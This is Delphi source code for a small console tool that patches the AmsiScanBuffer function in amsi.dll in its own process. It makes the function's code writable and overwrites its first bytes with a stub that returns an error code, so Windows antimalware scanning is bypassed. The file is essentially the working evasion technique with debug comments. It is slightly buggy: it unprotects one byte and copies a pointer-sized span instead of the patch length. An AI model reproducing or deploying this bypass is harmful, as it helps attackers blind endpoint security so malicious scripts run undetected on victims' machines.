program BasedAmsi_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
https://www.sunshine2k.de/articles/coding/tut_Patcher.htm
https://progamercity.net/delphi/245-delphi-memory-modification-tutorial-amp-template.html
https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
https://delphi.cjcsoft.net/viewthread.php?tid=42761&extra=page%3D1
https://www.askingbox.com/tip/delphi-lazarus-show-byte-array-as-string-of-hex-values
}

uses
  System.SysUtils,
  Windows
  ;


type
  TByteArr = array of Byte;

var
  PidHandle: integer;
  PidID : integer;
  Written: UIntPtr;
  lib : THandle;
  asb : Pointer;
  NumWrote : SIZE_T;
  //OldProtect : DWord;
  OldProtect : DWord;
  //PATCH : Byte = $C3;
  PATCH : array[0..5] of Byte = ($B8, $57, $00, $07, $80, $C3);
  BA: TByteArr;




//Add bps
//Step to load
//Save bin of amsi.dll in memory
//Step past Protect,Patch,ReProtect
//Save bin of amsi.dll in memory
//$(cmp pre-patch.bin post-patch.bin)

function ByteArrayToHexString(BA: TByteArr; Sep: string = ''): string;
var
  i, k: integer;
begin
  result:='';

  if Sep='' then begin
     for i:=low(BA) to high(BA) do
       result := result + IntToHex(BA[i], 2);
  end else begin
     k:=high(BA);
     for i:=low(BA) to k do begin
        result:= result + IntToHex(BA[i], 2);
        if k<>i then result := result + Sep;
     end;
  end;
end;


begin
  try
  //Load and get base address for AmsScanBuffer
    lib := LoadLibrary('amsi.dll');
    asb := GetProcAddress(lib,'AmsiScanBuffer');
    WriteLn(Format('[+] amsi.dll base address: %p',[asb]));
    //amsi.dll base address at   0000-7FF9-E16E-35E0
    //ScanStringBuffer Loaded at 0000-0000-0000-25e0 inside RX region of 2nd image


  //Change memory protection to RWX
    WriteLn('[+] Attempting to change protections');
    ////VirtualProtect(asb, UIntPtr(SizeOf(garbage)), 64, 0);
    VirtualProtect(asb, 1, 64, OldProtect);
    WriteLn('[+] RWX protected');

  //Write to memory @ pter
    SetLength(BA,5);
    BA[0] := PATCH[0];
    BA[1] := PATCH[1];
    BA[2] := PATCH[2];
    BA[3] := PATCH[3];
    BA[4] := PATCH[4];

    WriteLn('[+] Patching with PATCH ', ByteArrayToHexString(BA,' '), ' of length ', SizeOf(PATCH));
    Move(PATCH, asb^, SizeOf(BA));


    //WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
    WriteLn('[+] Written RET To the start of ScanStringBuffer');

  //Change memory protection to RX
    VirtualProtect(asb, 1, OldProtect, OldProtect);
    //VirtualProtect(asb, 1, 4, 0);
    WriteLn('[+] RX protected');


  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.

